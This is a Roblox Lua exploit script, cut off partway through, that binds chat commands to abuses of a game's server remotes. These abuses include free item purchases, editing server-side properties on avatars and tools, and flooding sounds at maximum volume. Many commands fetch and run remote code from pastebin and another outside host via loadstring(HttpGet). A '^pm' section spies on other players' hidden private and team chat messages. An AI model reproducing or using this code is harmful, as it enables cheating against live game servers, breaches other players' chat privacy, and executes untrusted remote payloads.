CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"],"CanBeDropped",true)
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["LocalScript"],"Disabled",false)
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"],"Name",Name)

	game:GetService("RunService").Heartbeat:Connect(function()
		local X = game.Workspace.RIP_Demonic.SuperFlyGoldBoombox.Handle.Ultimax.PlaybackLoudness / 3000 + .5
        CE:FireEvent("PompousTheCloud",MainUserW["Head"]["Mesh"],"Scale",Vector3.new(X,X,X))
	  
	end)

end
if msg:lower() == "^music " then
local UserName  = game:GetService('Players').LocalPlayer.Name
local Autoride = true
workspace.GiveTool:FireServer(XXX,"PompousTheCloud")
workspace.GiveTool:FireServer(XXX,"SuperFlyGoldBoombox")
local Icon, Mesh, Texture = 4106914537, 1254388357, 3806584137
local Name, ToolTip = "SuperFlyGoldBoombox", "Love you, By RIP_Demonic"

local CE = {}
local Variables = {
	workspace = game:GetService("Workspace"),
	players = game:GetService("Players")
}

local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)

function CE:FireEvent(ItemName, Object, Property, Value)
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end

Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW

CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"],"TextureId","rbxassetid://"..Icon)
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["Mesh"],"MeshId","rbxassetid://"..Mesh)
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["Mesh"],"TextureId","rbxassetid://"..Texture)
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["Mesh"],"Scale",Vector3.new(0.1,0.1,0.1))
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"Name","Ultimax")
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["Ultimax"],"Playing",false)
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["Ultimax"],"Volume","999999")
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["Ultimax"],"EmmiterSize","999999")
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["Ultimax"],"MaxDistance","999999")
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["Ultimax"],"Looped",true)
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"]["Ultimax"],"Playing",true)
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"],"Material","ForceField")
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"],"BrickColor",BrickColor.new(255,0,255))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(0.1,0.1,0.1))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"],"Material","ForceField")
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"],"BrickColor",BrickColor.new(0,0,0))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://"..Mesh)
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://"..Texture)
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(0,0,-1))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0,-1,0))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1,0,0))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(0,1,0))
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["Mesh"],"Scale",Vector3.new(0.5,0.5,0.5))
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["Mesh"],"MeshId","rbxassetid://"..Mesh)
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["Mesh"],"TextureId","rbxassetid://"..Texture)
CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Material","ForceField")
CE:FireEvent("PompousTheCloud",MainUserW["Head"],"BrickColor",BrickColor.new(255,0,255))
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"],"GripForward",Vector3.new(0,0,-1))
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"],"GripPos",Vector3.new(0,-1,0))
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"],"GripRight",Vector3.new(1,0,0))
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"],"GripUp",Vector3.new(0,1,0))
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"],"ToolTip",ToolTip)
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"],"CanBeDropped",true)
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["LocalScript"],"Disabled",false)
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"],"Name",Name)
	while true do
	game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"],"Color",Color3.new(255/255,0/255,0/255)) 
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"],"EffectCloud",Color3.new(255/255,0/255,0/255))
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"],"Color",Color3.new(255/255,0/255,0/255))
CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Color",Color3.new(255/255,0/255,0/255))
    for i = 0,255,100 do
	game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"],"Color",Color3.new(255/255,i/255,0/255))  
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"],"EffectCloud",Color3.new(255/255,i/255,0/255))
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"],"Color",Color3.new(255/255,i/255,0/255))
CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Color",Color3.new(255/255,i/255,0/255))
    end
    for i = 255,0,-100 do
	game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"],"Color",Color3.new(i/255,255/255,0/255))  
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"],"EffectCloud",Color3.new(i/255,255/255,0/255))
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"],"Color",Color3.new(i/255,255/255,0/255))
CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Color",Color3.new(i/255,255/255,0/255))
    end
    for i = 0,255,100 do
	game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"],"Color",Color3.new(0/255,255/255,i/255)) 
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"],"EffectCloud",Color3.new(0/255,255/255,i/255))
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"],"Color",Color3.new(0/255,255/255,i/255))
CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Color",Color3.new(0/255,255/255,i/255))
    end
    for i = 255,0,-100 do
	game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"],"Color",Color3.new(0/255,i/255,255/255))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["EffectCloud"],"Color",Color3.new(0/255,i/255,255/255))
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"],"Color",Color3.new(0/255,i/255,255/255))
CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Color",Color3.new(0/255,i/255,255/255))
    end
    for i = 0,255,100 do
    game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"],"Color",Color3.new(i/255,0/255,255/255))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["EffectCloud"],"Color",Color3.new(i/255,0/255,255/255))
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"],"Color",Color3.new(i/255,0/255,255/255))
CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Color",Color3.new(i/255,0/255,255/255))
    end
    for i = 255,0,-100 do
	game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"],"Color",Color3.new(255/255,0/255,i/255))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["EffectCloud"],"Color",Color3.new(255/255,0/255,i/255))
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"],"Color",Color3.new(255/255,0/255,i/255))
CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Color",Color3.new(255/255,0/255,i/255))
    end
end
end
    if msg:lower() == "^arms" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud") -- YOUR GAMEPASS


local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW -- DON'T EDIT
CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Transparency","1")
    end
    if msg:lower() == "^legs" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud") -- YOUR GAMEPASS


local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW -- DON'T EDIT
CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Transparency","1")
    end
    if msg:lower() == "^head" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud") -- YOUR GAMEPASS


local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW -- DON'T EDIT
CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["face"]:Remove())
    end
    if msg:lower() == "^bbat" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/zq4TYFG1"))()
    end
	if msg:lower() == "^ambulance" then 
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/Zg7dnb5K"))()
    end
    if msg:lower() == "^badnoob" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
		loadstring(game:HttpGet("https://pastebin.com/raw/tB0He0HJ"))()
	end
    if msg:lower() == "^ak" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/EK2yyybY"))()
    end
    if msg:lower() == "^cool" then        
		while wait() do
	    game.Workspace.GuiEvent:FireServer("Speed.") 
            wait(0.5)
	    game.Workspace.GuiEvent:FireServer("Speed..") 
            wait(0.5)
            game.Workspace.GuiEvent:FireServer("Speed...") 
            wait(0.5)
            game.Workspace.GuiEvent:FireServer("Speed....") 
            wait(0.5)
	    end
	end
	if msg:lower() == "unknown" then
                game.Workspace.GiveTool:FireServer(IDFORSPAWNER, "PompousTheCloud") 
local UserName  = game:GetService("Players").LocalPlayer.Name
local Autoride = true 
local Name, ToolTip = "KTOOL", "Bodymesh" 
local CE = {}
local Variables = {
    workspace = game:GetService("Workspace"), 
    players = game:GetService("Players") 
}
local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName) 

function CE:FireEvent(ItemName, Object, Property, Value) 
    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

Variables.workspace.Buy:FireServer(0, "PompousTheCloud") 
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW 

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://") 

CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Material",Enum.Material.ForceField)
CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Material",Enum.Material.ForceField)
	end
	if msg:lower() == "unknown" then
                game.Workspace.GiveTool:FireServer(IDFORSPAWNER, "PompousTheCloud") 
local UserName  = game:GetService("Players").LocalPlayer.Name
local Autoride = true 
local Name, ToolTip = "KTOOL", "Bodymesh" 
local CE = {}
local Variables = {
    workspace = game:GetService("Workspace"), 
    players = game:GetService("Players") 
}
local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName) 

function CE:FireEvent(ItemName, Object, Property, Value) 
    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

Variables.workspace.Buy:FireServer(0, "PompousTheCloud") 
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW 

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://") 

CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Material",Enum.Material.ForceField)
CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Material",Enum.Material.ForceField)
	end
	if msg:lower() == "unknown" then
                game.Workspace.GiveTool:FireServer(IDFORSPAWNER, "PompousTheCloud") 
local UserName  = game:GetService("Players").LocalPlayer.Name
local Autoride = true 
local Name, ToolTip = "KTOOL", "Bodymesh" 
local CE = {}
local Variables = {
    workspace = game:GetService("Workspace"), 
    players = game:GetService("Players") 
}
local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName) 

function CE:FireEvent(ItemName, Object, Property, Value) 
    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

Variables.workspace.Buy:FireServer(0, "PompousTheCloud") 
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW 

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://") 

CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Material",Enum.Material.ForceField)
	end
	if msg:lower() == "unknown" then
                game.Workspace.GiveTool:FireServer(IDFORSPAWNER, "PompousTheCloud") 
local UserName  = game:GetService("Players").LocalPlayer.Name
local Autoride = true 
local Name, ToolTip = "KTOOL", "Bodymesh" 
local CE = {}
local Variables = {
    workspace = game:GetService("Workspace"), 
    players = game:GetService("Players") 
}
local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName) 

function CE:FireEvent(ItemName, Object, Property, Value) 
    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

Variables.workspace.Buy:FireServer(0, "PompousTheCloud") 
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW 

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://") 

CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Material",Enum.Material.ForceField)
	end
	if msg:lower() == "^ff" then
                game.Workspace.GiveTool:FireServer(IDFORSPAWNER, "PompousTheCloud") 
local UserName  = game:GetService("Players").LocalPlayer.Name
local Autoride = true 
local Name, ToolTip = "KTOOL", "Bodymesh" 
local CE = {}
local Variables = {
    workspace = game:GetService("Workspace"), 
    players = game:GetService("Players") 
}
local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName) 

function CE:FireEvent(ItemName, Object, Property, Value) 
    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

Variables.workspace.Buy:FireServer(0, "PompousTheCloud") 
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW 

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://") 

CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Material",Enum.Material.ForceField)
CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Material",Enum.Material.ForceField)
CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Material",Enum.Material.ForceField)
CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Material",Enum.Material.ForceField)
CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Material",Enum.Material.ForceField)
CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Material",Enum.Material.ForceField)
	end
    if msg:lower() == "^viplnvalid" then
local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
while wait() do
	CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Font","Cartoon")
	CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","NOTVIP")
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(255,0,0))
    wait(.0000000000000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(75,0,130))
    wait(.0000000000000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(255,165,0))
    wait(.0000000000000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(0,0,255))
    wait(.0000000000000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(0,128,0))
    wait(.0000000000000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(0,128,0))
    wait(.0000000000000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(0,0,255))
    wait(.0000000000000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(255,165,0))
    wait(.0000000000000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(75,0,130))
    wait(.0000000000000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(255,0,0))
    wait(.0000000000000000001)
    end
end
    if msg:lower() == "^acp" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/bHD8YmrD"))()
    end
    if msg:lower() == "^fat" then
game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Shape","Ball")
CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Size",Vector3.new(2,2,2))
CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Shape","Ball")
CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Size",Vector3.new(2,2,2))
CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Shape","Ball")
CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Size",Vector3.new(2,2,2))
CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Shape","Ball")
CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Size",Vector3.new(2,2,2))
CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Shape","Badll")
CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Size",Vector3.new(2,2,2))
CE:FireEvent("PompousTheCloud",MainUserW["Shirt"],"ShirtTemplate","rbxassetid://249458025")
CE:FireEvent("PompousTheCloud",MainUserW["Pants"],"PantsTemplate","rbxassetid://280452751")
    end
    if msg:lower() == "^infyl" then
        loadstring(game:HttpGet("https://pastebin.com/raw/tzTXmYf2"))()
    end
    if msg:lower() == "notvalid" then
        loadstring(game:HttpGet(('http://genocide.monster/script_source'),true))()
    end
    if msg:lower() == "^couch" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/MLmdLvaH"))()
    end
        if msg:lower() == "^noob" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/aUnrfhmy"))()
    end
        if msg:lower() == "^pm" then
        --This script reveals ALL hidden messages in the default chat
--chat "/spy" to toggle!
enabled = false
--if true will check your messages too
spyOnMyself = true
--if true will chat the logs publicly (fun, risky)
public = false
--if true will use /me to stand out
publicItalics = true
--customize private logs
privateProperties = {
	Color = Color3.fromRGB(0,255,255); 
	Font = Enum.Font.SourceSansBold;
	TextSize = 18;
}
--////////////////////////////////////////////////////////////////
local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance

local function onChatted(p,msg)
	if _G.chatSpyInstance == instance then
		if p==player and msg:lower():sub(1,4)=="/spy" then
			enabled = not enabled
			wait(0.3)
			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
		elseif enabled and (spyOnMyself==true or p~=player) then
			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
			local hidden = true
			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
					hidden = false
				end
			end)
			wait(1)
			conn:Disconnect()
			if hidden and enabled then
				if public then
					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
				else
					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
				end
			end
		end
	end
end

for _,p in ipairs(Players:GetPlayers()) do
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
    end    
        if msg:lower() == "^dom" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/m2BMpbG4"))()
    end
if string.sub(msg,1,6) == ("lnvalid")then
    while true do 
        for i = 0,1,0.1 do 
            game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new(Color3.fromHSV(i,1,1)))    
            wait(.1)
        end    
    end
end
if string.sub(msg,1,2) == ("re")then
    game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(15)
end
if string.sub(msg,1,3) == ("'rj")then
game:GetService("TeleportService"):Teleport(game.PlaceId, 
game:GetService("Players").LocalPlayer)
end
local gamepassId = IDFORSPAWNER

local RobloxianLife = loadstring(game:HttpGetAsync("https://pastebin.com/raw/HTF0vRHF"))()
local CommandApi = loadstring(game:HttpGetAsync("https://pastebin.com/raw/3mHL7pKv"))()
local players = game:GetService("Players")
local localPlayer = players.localPlayer

RobloxianLife:Initialize(gamepassId)

local function strStarts(String,Start)
    return string.sub(String,1,string.len(Start))==Start
end

local function getPlayerByName(name)
    local plrs = {}

    if name == "me" then
        table.insert(plrs, localPlayer)
        return plrs
    elseif name == "others" then
        for i,v in pairs(players:GetPlayers()) do
            if v.Name ~= localPlayer.Name then
                table.insert(plrs, v)
            end
        end
        return plrs
    elseif name == "all" then
        for i,v in pairs(players:GetPlayers()) do
            table.insert(plrs, v)
        end
        return plrs
    elseif name == "random" then
        table.insert(plrs, players:GetPlayers()[math.random(1, #players:GetPlayers())])
        return plrs
    end

    for i,v in pairs(players:GetPlayers()) do
        if strStarts(v.Name, name) then
            table.insert(plrs, v)
        end
    end
    return plrs
end

CommandApi:AddCommand("lnvalid", function(name)
    for i,v in pairs(getPlayerByName(name)) do
